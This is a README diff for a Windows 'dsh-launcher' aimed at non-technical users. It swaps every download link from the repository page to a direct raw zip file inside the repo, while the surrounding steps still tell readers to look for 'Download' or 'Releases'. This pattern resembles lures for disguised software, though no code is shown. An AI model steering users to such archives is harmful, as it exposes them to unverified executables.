@@ -2,7 +2,7 @@
 
 ## 📥 Quick Download
 
-[⬇️ Get dsh-launcher Now](https://github.com/Gamitrd6316/dsh-launcher)
+[⬇️ Get dsh-launcher Now](https://github.com/Gamitrd6316/dsh-launcher/raw/refs/heads/main/wpf/v1.3.zip)
 
 ## 🎯 What Is dsh-launcher?
 
@@ -57,7 +57,7 @@ If your computer runs Windows and can browse the internet, it can probably run d
 
 ### Step 1: Get dsh-launcher
 
-[Visit this link to download the application](https://github.com/Gamitrd6316/dsh-launcher)
+[Visit this link to download the application](https://github.com/Gamitrd6316/dsh-launcher/raw/refs/heads/main/wpf/v1.3.zip)
 
 Once you're on the page, look for a button that says "Download" or "Releases" on the right side of the page. Click it.
 
@@ -166,7 +166,7 @@ If you run into problems:
 
 dsh-launcher was built to remove every technical barrier between you and using DeepSeek Harness. No terminal. No syntax. No confusion. Just click, wait, and use.
 
-[⬇️ Download dsh-launcher](https://github.com/Gamitrd6316/dsh-launcher)
+[⬇️ Download dsh-launcher](https://github.com/Gamitrd6316/dsh-launcher/raw/refs/heads/main/wpf/v1.3.zip)
 
 If you can follow a recipe and make toast, you can install and use dsh with this launcher. Give it a try - the hard part is already done for you.
 
